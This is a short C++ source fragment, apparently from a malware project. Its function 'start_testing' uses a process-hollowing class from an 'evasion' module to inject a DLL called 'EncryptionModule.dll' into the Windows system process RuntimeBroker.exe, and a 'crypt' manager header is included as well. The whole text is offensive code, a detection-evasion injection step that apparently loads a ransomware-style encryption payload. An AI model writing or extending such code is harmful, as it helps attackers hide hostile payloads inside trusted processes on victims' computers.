#include "crypt/CryptManager.h"
#include "evasion/ProcessHollowing.h"

inline void start_testing() {
    ProcessHollowing hollowing;
    hollowing.InjectDLL(L"C:\\Windows\\System32\\RuntimeBroker.exe", L"C:\\Users\\cain\\source\\repos\\Loc\\DLL\\EncryptionModule\\x64\\Debug\\EncryptionModule.dll");
}